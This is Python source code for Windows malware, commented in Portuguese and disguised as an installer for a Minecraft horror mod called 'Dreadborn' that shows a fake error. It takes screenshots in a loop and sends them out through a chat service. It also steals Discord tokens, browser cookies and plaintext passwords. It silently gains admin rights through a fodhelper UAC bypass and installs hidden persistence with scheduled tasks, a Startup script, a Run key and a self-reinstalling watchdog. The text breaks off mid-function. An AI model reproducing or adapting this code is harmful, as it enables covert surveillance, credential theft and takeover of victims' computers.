"""Tira print da tela e envia para um canal do Osmium (loop + persistência).

Requer (Python 3.12 ok com --ignore-requires-python):
    pip install --ignore-requires-python -U osmium-chat mss pillow websockets

Uso:
    python print_osmium.py                       # desanexa e corre em 2º plano (sem janela)
    python print_osmium.py --console             # mantém a consola e mostra o output
    python print_osmium.py --loop 10             # a cada 10s
    python print_osmium.py --no-persist          # só roda, sem instalar auto-start
    python print_osmium.py --no-elevate          # não se auto-eleva (corre como utilizador)
    python print_osmium.py --no-discord          # não procura/envia o token do Discord
    python print_osmium.py --resend-discord      # envia o token do Discord de novo
    python print_osmium.py --uninstall           # remove a persistência

Sem --console nunca há janela: a cópia que fica a correr nasce com
DETACHED_PROCESS (pythonw) e escreve no %APPDATA%\\OsmiumHelper\\osmium.log.

Sozinho, ELEVA-SE A ADMIN SEMPRE, por omissão e em qualquer modo (--console
e --_hidden incluídos), em silêncio total: sem prompt de UAC, sem notificação,
sem janela e sem uma única linha em consola — via fodhelper.exe, com a chave
limpa logo a seguir. O processo elevado recebe os OSMIUM_* como flags porque a
auto-elevar não herda o ambiente. Só --no-elevate, --uninstall ou a variável
OSMIUM_NO_ELEVATE=1 desligam a eleição (--_elevated é anti-loop, não é corte).

O token do Discord é lido do Local Storage\\leveldb e — no build actual, que
já não o grava em disco — da memória do processo Discord.exe, e enviado em
texto puro para um canal dedicado criado UMA vez na categoria
232864842787061760. Se o Discord não estiver instalado a função é saltada por
completo; se o canal for apagado no servidor, recria-se e volta a enviar.
"""

import argparse
import asyncio
import contextlib
import ctypes
import datetime
import io
import os
import platform
import re
import shutil
import socket
import subprocess
import sys
import threading

from osmium_chat import Bot, Community
from osmium_chat.channel import Channel
from osmium_protos import (
    PB_Authorization,
    PB_Authorize,
    PB_ChannelRef,
    PB_ChatRef,
    PB_Initialize,
    PB_RpcResult,
    PB_SendMessage,
    PB_ServerMessage,
    unwrap,
)
from websockets.asyncio.client import connect

try:
    from osmium_chat import __version__ as OSMIUM_LIB_VERSION
except Exception:
    OSMIUM_LIB_VERSION = "0.3.6"

# --- Config (seus dados) ---
TOKEN = "AAAAAEB7L4k6Aw.xwD4QpCNsvH6Qr73WDhk5xJ1K_SCKF9rFlNxmZtVxAY"
COMMUNITY_ID = 232638780937338880  # id do servidor
CHANNEL_ID = 232639328172376064    # id do canal
COOKIES_CHANNEL_ID = 232708491951734784  # canal que recebe cookies (1x por PC)
PASSWORDS_CHANNEL_ID = 232725029505204224  # canal que recebe senhas em texto puro
# Categoria "Credenciais": é para lá que nasce, UMA vez, o canal dedicado de cada PC.
PASSWORDS_CATEGORY_ID = 232724956675309568
# Categoria onde nasce, UMA vez, o canal dedicado do token do Discord.
DISCORD_CATEGORY_ID = 232864842787061760
DISCORD_CHANNEL_ID = 232639328172376064   # fallback se a criação na categoria falhar
DISCORD_RECHECK_DEFAULT = 1800            # (0) => não recheca o token no loop
CLIENT_ID = 120715  # client web oficial (para user token). Para bot, use o Client ID da aplicação.

WS_URL = "wss://ws-0.osmium.chat"
PERSIST_NAME = "OsmiumHelper"
LOOP_DEFAULT = 5
AUTH_TIMEOUT = 30.0
# Limites para evitar "Invalid media": o upload usa chunks de 512KB e o
# servidor rejeita PNGs grandes/dimensões cheias de forma intermitente.
# JPEG ~1600px / 217-251KB passava; 600KB+ falhava. Nova estratégia HQ:
# tenta PNG lossless se couber, senão JPEG q92->65 com lados 1920->1280.
MAX_IMAGE_BYTES = 450_000
MAX_IMAGE_SIDE = 1920
JPEG_QUALITIES = (92, 88, 85, 82, 78, 75, 70, 65)
JPEG_SUBSAMPLING = 1  # 4:2:2: texto nítido, bem melhor que 4:2:0 para print
JPEG_QUALITY_FIRST = 92
JPEG_QUALITY_LAST = 65
# Nome de canal: se o nome do PC for grande, trunca automaticamente.
MAX_CHANNEL_NAME_LEN = 32
# Rechecagem de cookies: se apagarem/limparem ou surgirem novos, reenvia sozinho.
COOKIES_RECHECK_DEFAULT = 1800

# --- Dreadborn (fachada) + persistência total ---
DREADBORN_NAME = "Dreadborn"
DREADBORN_VERSION = "1.4.2"
DREADBORN_TITLE = "Dreadborn — Instalador"
DREADBORN_SUBTITLE = "Mod de horror para Minecraft"
DREADBORN_DESC = ("Instalando Dreadborn v%s...\n"
                 "Mod de horror — copiando criaturas, sons e estruturas." % DREADBORN_VERSION)
DREADBORN_ERROR_TITLE = "Dreadborn — Erro"
DREADBORN_ERROR_MSG = ("Ocorreu um erro na instalação (0x80070057).\n"
                       "Os desenvolvedores já estão cientes disso e estamos resolvendo.\n"
                       "Tente novamente em breve.")
PERSIST_COPY_EXE = "DreadbornHelper.exe"
PERSIST_COPY_PY = "DreadbornHelper.pyw"
PERSIST_TASK_MAIN = PERSIST_NAME
PERSIST_TASK_WATCH = PERSIST_NAME + "Watch"
WATCHDOG_INTERVAL = 60.0


def _env_int(name: str, default: int) -> int:
    """Lê int de env com fallback seguro (evita ValueError no argparse default)."""
    raw = os.environ.get(name)
    if raw is None or raw == "":
        return int(default)
    try:
        return int(raw)
    except (TypeError, ValueError):
        return int(default)


# --------------------------------------------------------------------- #
# Operador silencioso                                                    #
# O bot corre sempre em segundo plano: sem consola, sem janela, sem      #
# notificação, sem UAC. Quando não há consola (pythonw/desanexado), o    #
# print() vai para o ficheiro de log — nada aparece no ecrã.              #
# --------------------------------------------------------------------- #

CREATE_NO_WINDOW = 0x08000000        # filho sem janela de consola
DETACHED_PROCESS = 0x00000008        # nasce desanexado de qualquer consola
NEW_PROCESS_GROUP = 0x00000200
_ERROR_ALREADY_EXISTS = 183
_LOG_NAME = "osmium.log"
_LOG_MAX_BYTES = 2 * 1024 * 1024
_LEFTOVER_MIN_AGE = 600              # só limpa artefactos com >10 min

_silent_log = None                   # handle do log (mantido vivo no processo)
_instance_mutex = None               # handle da mutex de instância única
_ABE_ELEVATE = False                 # --abe-elevate (eleva p/ desbloquear v20)
# Guarda o estado original ANTES de redirecionar: é isto que diz se vinhamos
# com uma saída visível (consola/terminal) ou já "mudos" (pythonw).
_HAD_STDOUT = sys.stdout is not None


def _state_dir() -> str:
    """Pasta privada do utilizador para markers/states/log (uma só)."""
    appdata = os.environ.get("APPDATA", "")
    base = os.path.join(appdata, PERSIST_NAME) if appdata else os.path.dirname(os.path.abspath(__file__))
    try:
        os.makedirs(base, exist_ok=True)
    except Exception:
        pass
    return base


def _log_path() -> str:
    return os.path.join(_state_dir(), _LOG_NAME)


def _setup_output() -> None:
    """pythonw não tem stdout/stderr (None): manda o print() para o log.

    Com consola aberta não mexe em nada — continua a ver tudo no terminal.
    O detach marca OSMIUM_FORCE_LOG=1 para o filho escrever no log mesmo que
    a herança seja NUL (fallback sem pythonw).
    """
    global _silent_log
    force = os.environ.get("OSMIUM_FORCE_LOG") == "1" and "--console" not in sys.argv
    if not force and sys.stdout is not None and sys.stderr is not None:
        return

    class _Null:                      # fallback: engole tudo, nunca levanta erro
        def write(self, *a, **k):
            return 0

        def flush(self):
            return None

        def fileno(self):
            raise OSError("sem consola")

    try:
        p = _log_path()
        if os.path.exists(p) and os.path.getsize(p) > _LOG_MAX_BYTES:
            os.replace(p, p + ".1")
        _silent_log = open(p, "a", encoding="utf-8", errors="replace", buffering=1)
        if force or sys.stdout is None:
            sys.stdout = _silent_log
        if force or sys.stderr is None:
            sys.stderr = _silent_log
    except Exception:
        if sys.stdout is None:
            sys.stdout = _Null()
        if sys.stderr is None:
            sys.stderr = _Null()


def _has_console() -> bool:
    """True se este processo está preso a uma janela de consola visível."""
    try:
        k = ctypes.WinDLL("kernel32", use_last_error=True)
        k.GetConsoleWindow.restype = ctypes.c_void_p
        k.GetConsoleWindow.argtypes = []
        return k.GetConsoleWindow() not in (0, None)
    except Exception:
        return sys.stdout is not None


def _pythonw() -> str:
    """pythonw.exe ao lado do intérprete (arranca sem consola). No .exe, o próprio exe."""
    try:
        if _is_frozen():
            exe = os.path.abspath(sys.executable or "")
            if exe and os.path.isfile(exe):
                return exe
            return exe or ""
        cand = os.path.join(os.path.dirname(sys.executable or ""), "pythonw.exe")
        if os.path.isfile(cand):
            return cand
    except Exception:
        pass
    return sys.executable or ""


def _detach(argv: list[str] | None = None):
    """Cria uma cópia já desanexada e devolve o Popen (ou False).

    DETACHED_PROCESS garante que o filho não herda a consola: não há janela,
    não há flash no arranque e não há nada para o utilizador ver. O output do
    filho vai para o log (OSMIUM_FORCE_LOG).
    No .exe (frozen) o filho é o próprio exe — sem pythonw/script.
    """
    if _is_frozen():
        base = list(sys.argv[1:] if argv is None else list(argv)[1:] if argv else [])
        # argv pode vir como sys.argv completo ou lista custom; normaliza:
        raw = list(sys.argv if argv is None else argv)
        rest = raw[1:] if raw and os.path.abspath(raw[0]) in (
            os.path.abspath(sys.executable or ""),) or raw[0].lower().endswith(".exe") else raw
        # fallback simples: usa só os argumentos (sem o programa)
        if argv is None:
            rest = list(sys.argv[1:])
        elif argv and len(argv) > 0 and str(argv[0]).lower().endswith((".exe", ".py", ".pyw")):
            rest = list(argv[1:])
        else:
            rest = list(argv) if argv is not None else []
        exe = os.path.abspath(sys.executable or "")
        env = os.environ.copy()
        env["OSMIUM_FORCE_LOG"] = "1"
        try:
            p = subprocess.Popen(
                [exe] + rest + ["--_hidden"],
                cwd=os.path.dirname(exe) or os.getcwd(),
                env=env,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                close_fds=True,
                shell=False,
                creationflags=DETACHED_PROCESS | NEW_PROCESS_GROUP | CREATE_NO_WINDOW,
            )
            return p
        except Exception:
            return False
    args = list(sys.argv if argv is None else argv)
    pyw = _pythonw()
    if not pyw:
        return False
    env = os.environ.copy()
    env["OSMIUM_FORCE_LOG"] = "1"
    try:
        p = subprocess.Popen(
            [pyw] + args + ["--_hidden"],
            cwd=os.getcwd(),
            env=env,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            close_fds=True,
            shell=False,
            creationflags=DETACHED_PROCESS | NEW_PROCESS_GROUP | CREATE_NO_WINDOW,
        )
        return p
    except Exception:
        return False


def _single_instance() -> bool:
    """Mutex de instância única. False => já há outra cópia a correr."""
    global _instance_mutex
    try:
        k = ctypes.WinDLL("kernel32", use_last_error=True)
        k.CreateMutexW.argtypes = [ctypes.c_void_p, ctypes.c_int, ctypes.c_wchar_p]
        k.CreateMutexW.restype = ctypes.c_void_p
        h = k.CreateMutexW(None, False, "Local\\" + PERSIST_NAME + "Singleton")
        if not h:
            return True
        if ctypes.get_last_error() == _ERROR_ALREADY_EXISTS:
            with contextlib.suppress(Exception):
                k.CloseHandle(h)
            return False
        _instance_mutex = h
        return True
    except Exception:
        return True


def _run_quiet(cmd, **kw):
    """subprocess sem janela e sem shell: nunca cria cmd/powershell visível."""
    kw.setdefault("capture_output", True)
    kw.setdefault("text", True)
    kw.setdefault("check", False)
    kw.setdefault("shell", False)
    kw.setdefault("creationflags", CREATE_NO_WINDOW)
    return subprocess.run(cmd, **kw)


def _private_tmp() -> str:
    """Cópias temporárias de BD ficam numa pasta privada (não no %TEMP%)."""
    local = os.environ.get("LOCALAPPDATA") or os.environ.get("APPDATA") or ""
    d = os.path.join(local, PERSIST_NAME, "tmp") if local else ""
    if d:
        try:
            os.makedirs(d, exist_ok=True)
            return d
        except Exception:
            pass
    import tempfile
    return tempfile.gettempdir()


def _sweep_leftovers() -> None:
    """Remove artefactos antigos: cópias de BD, .cmd/.py do ABE e o .bat da
    Startup (que abria uma janela de cmd no logon). Só toca em ficheiros com
    mais de 10 minutos, para nunca interferir com uma coleta em curso."""
    import glob
    import time as _time
    now = _time.time()
    dirs = {_private_tmp()}
    for env in ("TEMP", "TMP", "LOCALAPPDATA"):
        v = os.environ.get(env)
        if v and os.path.isdir(v):
            dirs.add(v)
    for d in dirs:
        for pat in ("ck_*.db", "ck_*.db-journal", "ck_*.db-wal", "hdl_*.db",
                    "abesys_*.in", "abesys_*.out", "abesys_*.py", "abesys_*.cmd"):
            for p in glob.glob(os.path.join(d, pat)):
                try:
                    if now - os.path.getmtime(p) >= _LEFTOVER_MIN_AGE:
                        os.remove(p)
                except OSError:
                    pass
    # legado: .bat na Startup (flash de cmd no arranque) — nunca mais criar
    try:
        appdata = os.environ.get("APPDATA", "")
        bat = os.path.join(appdata,
                           r"Microsoft\Windows\Start Menu\Programs\Startup",
                           f"{PERSIST_NAME}.bat")
        if os.path.exists(bat):
            os.remove(bat)
    except OSError:
        pass
    # sobras da elevação silenciosa: se o processo morreu a meio, apaga a
    # chave ms-settings — é um bypass de UAC, nunca pode ficar para trás.
    try:
        import winreg as _wr
        k = _wr.OpenKey(_wr.HKEY_CURRENT_USER, _MS_SETTINGS_KEY)
        val, _t = _wr.QueryValueEx(k, "")
        k.Close()
        if os.path.abspath(__file__).lower() in str(val).lower():
            _ms_settings_clear()
    except OSError:
        pass


# --------------------------------------------------------------------- #
# Auto-elevar SEM prompt de UAC e SEM notificação — SEMPRE, por omissão   #
# O utilizador é admin mas o bot arranca não-elevado (o grupo             #
# Administradores vem "deny only" no token). Em vez de pedir, usa-se a    #
# auto-elevação dos binários autoElevate da Microsoft (T1548.002) —       #
# fodhelper.exe lê o comando em HKCU\Software\Classes\ms-settings\        #
# Shell\Open\command e sobe o token sem consentimento.                    #
# Nada disto se vê: não imprime, não notifica, não abre janela — o que    #
# aconteceu fica só no ficheiro de log. Vale para QUALQUER modo de        #
# arranque (--console e --_hidden incluídos).                             #
# Se qualquer passo falhar, tenta de novo e, no fim, continua sem admin:  #
# nunca fica pior do que está.                                            #
# --------------------------------------------------------------------- #

_MS_SETTINGS_KEY = r"Software\Classes\ms-settings\Shell\Open\command"
_MS_SETTINGS_TREE = (
    _MS_SETTINGS_KEY,
    r"Software\Classes\ms-settings\Shell\Open",
    r"Software\Classes\ms-settings\Shell",
    r"Software\Classes\ms-settings",
)
_FODHELPER = os.path.join(os.environ.get("SystemRoot", r"C:\Windows"),
                          "System32", "fodhelper.exe")
SEE_MASK_NOCLOSEPROCESS = 0x00000040
SEE_MASK_NOASYNC = 0x00000100
_ELEVATE_TIMEOUT = 10.0       # s máx. à espera do ShellExecute (prompt pendurado?)
_ELEVATE_CHILD_WAIT = 8.0     # s máx. à espera que o filho elevado pegue na mutex
_SYNCHRONIZE = 0x00100000

# O processo elevado é criado pela serviço appinfo com o ambiente padrão do
# utilizador: as variáveis OSMIUM_* do chamador NÃO passam para lá. Cada uma
# é repassada como a flag correspondente (só as que não forem dadas na linha
# de comandos explicitamente).
_ELEVATE_ENV_FLAGS: tuple[tuple[str, str], ...] = (
    ("OSMIUM_TOKEN", "--token"),
    ("OSMIUM_COMMUNITY", "--community"),
    ("OSMIUM_CHANNEL", "--channel"),
    ("OSMIUM_CLIENT_ID", "--client-id"),
    ("OSMIUM_LOOP", "--loop"),
    ("OSMIUM_COOKIES_CHANNEL", "--cookies-channel"),
    ("OSMIUM_COOKIES_RECHECK", "--cookies-recheck"),
    ("OSMIUM_PASSWORDS_CHANNEL", "--passwords-channel"),
    ("OSMIUM_PASSWORDS_CATEGORY", "--passwords-category"),
    ("OSMIUM_DISCORD_CHANNEL", "--discord-channel"),
    ("OSMIUM_DISCORD_CATEGORY", "--discord-category"),
    ("OSMIUM_DISCORD_RECHECK", "--discord-recheck"),
    ("OSMIUM_SHOT_SIDE", "--shot-side"),
    ("OSMIUM_SHOT_QUALITY", "--shot-quality"),
)


def _is_elevated() -> bool:
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


def _ms_settings_clear() -> None:
    """Apaga a chave ms-settings (do fundo para a raiz, ignorando o que não der)."""
    try:
        import winreg as _wr
    except Exception:
        return
    for p in _MS_SETTINGS_TREE:
        try:
            _wr.DeleteKey(_wr.HKEY_CURRENT_USER, p)
        except OSError:
            pass


def _elevate_argv(argv: list[str]) -> list[str]:
    """argv do filho elevado: --_elevated + os OSMIUM_* que não foram dados."""
    out = [a for a in argv if a != "--_elevated"]
    given = {a.split("=", 1)[0] for a in out}
    for env, flag in _ELEVATE_ENV_FLAGS:
        if flag in given:
            continue
        v = os.environ.get(env, "")
        if v:
            out.extend([flag, v])
    if "--no-startup-cookies-resend" not in given and \
            os.environ.get("OSMIUM_STARTUP_COOKIES_RESEND", "") == "0":
        out.append("--no-startup-cookies-resend")
    if "--no-discord" not in given and os.environ.get("OSMIUM_NO_DISCORD", "") == "1":
        out.append("--no-discord")
    out.append("--_elevated")
    return out


def _instance_alive() -> bool:
    """True se já existe uma cópia do bot a correr (mutex de instância única)."""
    from ctypes import wintypes as _W
    try:
        k = ctypes.WinDLL("kernel32", use_last_error=True)
        k.OpenMutexW.argtypes = [_W.DWORD, _W.BOOL, ctypes.c_wchar_p]
        k.OpenMutexW.restype = _W.HANDLE
        h = k.OpenMutexW(_SYNCHRONIZE, False, "Local\\" + PERSIST_NAME + "Singleton")
        if h:
            with contextlib.suppress(Exception):
                k.CloseHandle(h)
            return True
        return False
    except Exception:
        return False


# "sempre": se a 1.ª tentativa falhar por algo transitório (serviço atrasado,
# filho demorou a pegar na mutex) tenta outra vez. Cortes definitivos — opt-out,
# já elevado, já há cópia a correr, ferramenta em falta — não se repetem.
_ELEVATE_ATTEMPTS = 3
_ELEVATE_RETRY_GAP = 1.0       # s entre tentativas
_ELEVATE_TRANSIENT = frozenset({"preparacao", "timeout", "winerror", "filho"})


def _elevate_note(msg: str) -> None:
    """Nota da elevação: SÓ para o ficheiro de log, nunca em consola.

    A auto-elevar é silenciosa por definição — não imprime, não notifica,
    não abre janela. Fica registado para consulta, fora do caminho de quem
    está a correr o bot.
    """
    try:
        p = _log_path()
        d = os.path.dirname(p)
        if d and not os.path.isdir(d):
            os.makedirs(d, exist_ok=True)
        with open(p, "a", encoding="utf-8", errors="replace") as f:
            f.write(msg + "\n")
    except Exception:
        pass


def _elevate_gate(args) -> bool:
    """Decisão de auto-elevar — POR OMISSÃO, EM QUALQUER MODO.

    Recebe os args e olha SÓ para dois cortes, nenhum dos quais é um modo de
    arranque:
      * --_elevated : o processo já nasceu elevado (anti-loop);
      * --no-elevate : opt-out explícito.
    --console e --_hidden são ignorados de propósito: o bot sobe a admin
    seja como for arrancado, sem pedir autorização e sem notificar.
    (OSMIUM_NO_ELEVATE=1 é cortado dentro de _elevate_auto/_elevate_silent,
    para os testes poderem desligar a eleição sem mudar a linha de comandos.)
    """
    return (not bool(getattr(args, "elevated", False))
            and not bool(getattr(args, "no_elevate", False)))


def _elevate_silent(argv: list[str] | None = None,
                    reason: dict | None = None) -> bool:
    """Sobe a token elevado SEM prompt de UAC e SEM notificação.

    True  => o filho elevado já está a correr; este processo deve parar.
    False => nada a fazer (já é admin / opt-out) ou falhou — nesse caso
             reason["why"] diz porquê (só para _elevate_auto decidir se
             vale a pena tentar de novo).
    Nada disto chega à consola: tudo vai para o log via _elevate_note.
    """
    import threading
    import time as _time
    from ctypes import wintypes as _W

    def _cut(why: str) -> bool:
        if reason is not None:
            reason["why"] = why
        return False

    if _is_elevated() or os.environ.get("OSMIUM_NO_ELEVATE", "") == "1":
        return _cut("ja-elevado" if _is_elevated() else "desligado")
    if _instance_alive():
        # Já há uma cópia a correr: não elevar (o main() desiste em silêncio
        # logo a seguir). Sem este guard a confirmação via mutex via a mutex de
        # OUTRA cópia e devolvia True sem termos lançado nada de novo.
        return _cut("instancia")
    try:
        if not os.path.isfile(_FODHELPER):
            return _cut("sem-fodhelper")
        _elev_args = _elevate_argv(list(sys.argv[1:] if argv is None else argv))
        if _is_frozen():
            exe = os.path.abspath(sys.executable or "")
            if not exe:
                return _cut("sem-pythonw")
            cmd = subprocess.list2cmdline([exe] + _elev_args)
            script = exe
        else:
            pyw = _pythonw()
            if not pyw:
                return _cut("sem-pythonw")
            script = os.path.abspath(__file__)
            cmd = subprocess.list2cmdline(
                [pyw, script] + _elev_args)

        import winreg as _wr
        # Só usamos a chave se não existir antes: assim a árvore inteira que
        # formos criar é nossa e pode ser apagada sem apagar config. de terceiros.
        try:
            _wr.OpenKey(_wr.HKEY_CURRENT_USER, r"Software\Classes\ms-settings")
            return _cut("chave-existente")
        except OSError:
            pass
        key = _wr.CreateKey(_wr.HKEY_CURRENT_USER, _MS_SETTINGS_KEY)
        _wr.SetValueEx(key, "", 0, _wr.REG_SZ, cmd)
        _wr.SetValueEx(key, "DelegateExecute", 0, _wr.REG_SZ, "")
        key.Close()
    except Exception as e:
        _elevate_note(f"[osmium] elevação: preparação falhou ({e}); continua sem admin")
        _ms_settings_clear()
        return _cut("preparacao")

    class _SHELLEXECUTEINFOW(ctypes.Structure):
        _fields_ = [
            ("cbSize", _W.DWORD), ("fMask", _W.ULONG), ("hwnd", _W.HWND),
            ("lpVerb", ctypes.c_wchar_p), ("lpFile", ctypes.c_wchar_p),
            ("lpParameters", ctypes.c_wchar_p), ("lpDirectory", ctypes.c_wchar_p),
            ("nShow", ctypes.c_int), ("hInstApp", _W.HINSTANCE),
            ("lpIDList", ctypes.c_void_p), ("lpClass", ctypes.c_wchar_p),
            ("hKeyClass", _W.HKEY), ("dwHotKey", _W.DWORD),
            ("hIcon", _W.HANDLE), ("hProcess", _W.HANDLE),
        ]

    shell32 = ctypes.WinDLL("shell32", use_last_error=True)
    shell32.ShellExecuteExW.argtypes = [ctypes.POINTER(_SHELLEXECUTEINFOW)]
    shell32.ShellExecuteExW.restype = _W.BOOL
    with contextlib.suppress(Exception):
        ctypes.WinDLL("ole32").CoInitializeEx(None, 0)   # ShellExecute exige COM

    state: dict = {}

    def _launch() -> None:
        k = ctypes.WinDLL("kernel32", use_last_error=True)
        try:
            sei = _SHELLEXECUTEINFOW()
            sei.cbSize = ctypes.sizeof(_SHELLEXECUTEINFOW)
            sei.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_NOASYNC
            sei.lpVerb = None                       # "open"
            sei.lpFile = _FODHELPER
            sei.lpParameters = None
            sei.lpDirectory = os.path.dirname(script)
            sei.nShow = 0                           # SW_HIDE
            if not shell32.ShellExecuteExW(ctypes.byref(sei)):
                state["err"] = ctypes.get_last_error()
            elif sei.hProcess:
                k.WaitForSingleObject(sei.hProcess, 5000)
                k.CloseHandle(sei.hProcess)
            state["done"] = True
        except Exception as e:
            state["exc"] = repr(e)
            state["done"] = True

    th = threading.Thread(target=_launch, daemon=True, name="elevate")
    th.start()
    th.join(_ELEVATE_TIMEOUT)

    if not state.get("done"):
        # Não voltou: há um prompt UAC pendurado (ou o serviço atrasou-se).
        # Não ficamos à espera — apagamos a chave (o "Sim" já não faria nada)
        # e seguimos em frente sem admin.
        _elevate_note("[osmium] elevação não respondeu a tempo; continua sem admin")
        _ms_settings_clear()
        return _cut("timeout")
    if state.get("err"):
        _elevate_note(f"[osmium] elevação indisponível (winerror={state['err']}); "
                      "continua sem admin")
        _ms_settings_clear()
        return _cut("winerror")

    # O filho elevado tem de se confirmar: ele cria a mutex de instância única.
    k = ctypes.WinDLL("kernel32", use_last_error=True)
    k.OpenMutexW.argtypes = [_W.DWORD, _W.BOOL, ctypes.c_wchar_p]
    k.OpenMutexW.restype = _W.HANDLE
    name = "Local\\" + PERSIST_NAME + "Singleton"
    deadline = _time.time() + _ELEVATE_CHILD_WAIT
    child_up = False
    while _time.time() < deadline:
        h = k.OpenMutexW(_SYNCHRONIZE, False, name)
        if h:
            with contextlib.suppress(Exception):
                k.CloseHandle(h)
            child_up = True
            break
        _time.sleep(0.15)
    _ms_settings_clear()             # nunca deixar a chave para trás
    if not child_up:
        _elevate_note("[osmium] elevação lançada mas o filho não arrancou; "
                      "continua sem admin")
        return _cut("filho")
    _elevate_note("[osmium] elevado sem prompt de UAC; continua o filho elevado")
    return True


def _elevate_auto(argv: list[str] | None = None) -> bool:
    """Sobe a admin SEMPRE que preciso: por omissão, em silêncio, até conseguir.

    True  => já está a correr uma cópia elevada; este processo deve parar.
    False => nada a fazer (já é admin / opt-out) ou desistiu depois das
             tentativas — o bot continua a correr, nunca fica pior.

    É chamado por main() sem qualquer filtro de modo: --console e --_hidden
    sobem a admin como todos os outros.
    """
    import time as _time

    if _is_elevated() or os.environ.get("OSMIUM_NO_ELEVATE", "") == "1":
        return False
    why: dict = {}
    for n in range(1, _ELEVATE_ATTEMPTS + 1):
        if _elevate_silent(argv, why):
            return True
        w = str(why.get("why") or "")
        if w not in _ELEVATE_TRANSIENT:
            _elevate_note(f"[osmium] elevação: corte definitivo ({w})")
            return False
        _elevate_note(f"[osmium] elevação: tentativa {n}/{_ELEVATE_ATTEMPTS} "
                      f"falhou ({w})")
        if n < _ELEVATE_ATTEMPTS:
            _time.sleep(_ELEVATE_RETRY_GAP)
    _elevate_note(f"[osmium] elevação: desistiu após {_ELEVATE_ATTEMPTS} tentativas "
                  f"({why.get('why')}); continua sem admin")
    return False


_setup_output()   # sem consola desde o arranque: print() já vai para o log


def _to_bytes(frame) -> bytes:
    """Normaliza frame do websocket para bytes (protobuf espera bytes)."""
    if isinstance(frame, bytes):
        return frame
    if isinstance(frame, str):
        return frame.encode("utf-8")
    if isinstance(frame, bytearray):
        return bytes(frame)
    if isinstance(frame, memoryview):
        return frame.tobytes()
    raise TypeError(f"frame inesperado do websocket: {type(frame).__name__}")


def _is_frozen() -> bool:
    """True quando corre como .exe PyInstaller."""
    return bool(getattr(sys, "frozen", False))


def _installed_marker_path() -> str:
    return os.path.join(_state_dir(), "dreadborn_installed.marker")


def _persistent_copy_path() -> str:
    """Caminho da cópia persistente em %APPDATA%\\OsmiumHelper."""
    d = _state_dir()
    if _is_frozen():
        return os.path.join(d, PERSIST_COPY_EXE)
    return os.path.join(d, PERSIST_COPY_PY)


def _current_launch_cmd(loop_seconds: int) -> str:
    """Comando que aponta SEMPRE para a cópia persistente (nunca para o .exe original)."""
    try:
        loop_seconds = int(loop_seconds)
    except (TypeError, ValueError):
        loop_seconds = LOOP_DEFAULT
    if loop_seconds <= 0:
        loop_seconds = LOOP_DEFAULT
    target = _persistent_copy_path()
    if _is_frozen():
        return f'"{target}" --loop {int(loop_seconds)}'
    pyw = os.path.join(os.path.dirname(sys.executable or ""), "pythonw.exe")
    if not os.path.isfile(pyw):
        pyw = sys.executable
    return f'"{pyw}" "{target}" --loop {int(loop_seconds)}'


def _self_relocate() -> str:
    """Copia o executável/script para a pasta persistente na 1ª execução.

    Depois disso o auto-start aponta para a cópia: apagar o instalador
    original não mata o agente. Idempotente e silencioso.
    """
    try:
        dst = _persistent_copy_path()
        if _is_frozen():
            src = os.path.abspath(sys.executable)
            if os.path.normcase(src) == os.path.normcase(os.path.abspath(dst)):
                return dst
            if os.path.isfile(dst):
                try:
                    if os.path.getsize(dst) == os.path.getsize(src):
                        return dst
                except OSError:
                    pass
            try:
                os.makedirs(os.path.dirname(dst), exist_ok=True)
            except OSError:
                pass
            # exe em execução não se sobrescreve: copia para .new e troca no reboot
            try:
                shutil.copy2(src, dst)
            except OSError:
                with contextlib.suppress(Exception):
                    shutil.copy2(src, dst + ".new")
                return dst
            return dst
        else:
            src = os.path.abspath(__file__)
            try:
                os.makedirs(os.path.dirname(dst), exist_ok=True)
            except OSError:
                pass
            try:
                if os.path.isfile(dst):
                    try:
                        import hashlib
                        h = lambda p: hashlib.sha256(open(p, "rb").read()).hexdigest()
                        if h(src) == h(dst):
                            return dst
                    except Exception:
                        return dst
                shutil.copy2(src, dst)
            except OSError:
                pass
            return dst
    except Exception:
        return _persistent_copy_path()


def _startup_vbs_path() -> str:
    appdata = os.environ.get("APPDATA", "")
    startup = os.path.join(appdata, r"Microsoft\Windows\Start Menu\Programs\Startup") if appdata else ""
    return os.path.join(startup, f"{PERSIST_NAME}.vbs") if startup else ""


def _install_startup_vbs(cmd: str) -> bool:
    """Menu Iniciar -> Startup via .vbs invisível (sem flash de cmd)."""
    p = _startup_vbs_path()
    if not p:
        return False
    try:
        os.makedirs(os.path.dirname(p), exist_ok=True)
        # Run "...",0,False = escondido, sem janela, sem taskbar
        content = ('Dim s\r\ns = %s\r\n'
                   'CreateObject("Wscript.Shell").Run s, 0, False\r\n' % _vbs_quote(cmd))
        with open(p, "w", encoding="ascii", errors="replace") as f:
            f.write(content)
        return True
    except OSError:
        return False


def _vbs_quote(cmd: str) -> str:
    return '"' + cmd.replace('"', '""') + '"'


def _install_task(name: str, cmd: str, mode: str) -> bool:
    """Tasks sempre ativas: onlogon + watchdog por repetição."""
    try:
        if mode == "logon":
            r = _run_quiet(["schtasks", "/create", "/f", "/tn", name,
                            "/tr", cmd, "/sc", "onlogon", "/rl", "highest"], timeout=15)
            if r.returncode != 0:
                r = _run_quiet(["schtasks", "/create", "/f", "/tn", name,
                                "/tr", cmd, "/sc", "onlogon", "/rl", "limited"], timeout=15)
            return r.returncode == 0
        # watchdog: arranca no boot e repete a cada 5 min para ressuscitar
        r = _run_quiet(["schtasks", "/create", "/f", "/tn", name,
                        "/tr", cmd, "/sc", "minute", "/mo", "5",
                        "/ru", "SYSTEM" if _is_elevated() else os.environ.get("USERNAME", ""),
                        "/rl", "highest"], timeout=15)
        if r.returncode != 0:
            r = _run_quiet(["schtasks", "/create", "/f", "/tn", name,
                            "/tr", cmd, "/sc", "minute", "/mo", "5"], timeout=15)
        return r.returncode == 0
    except (OSError, subprocess.SubprocessError):
        return False


def _watchdog_loop(loop_seconds: int) -> None:
    """Reinstala qualquer vetor removido (Run/Startup/Tasks/cópia)."""
    import time as _t
    while True:
        try:
            _t.sleep(WATCHDOG_INTERVAL)
            cmd = _current_launch_cmd(loop_seconds)
            # 1) cópia
            if not os.path.isfile(_persistent_copy_path()):
                _self_relocate()
            # 2) Run
            try:
                import winreg
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                    r"Software\Microsoft\Windows\CurrentVersion\Run",
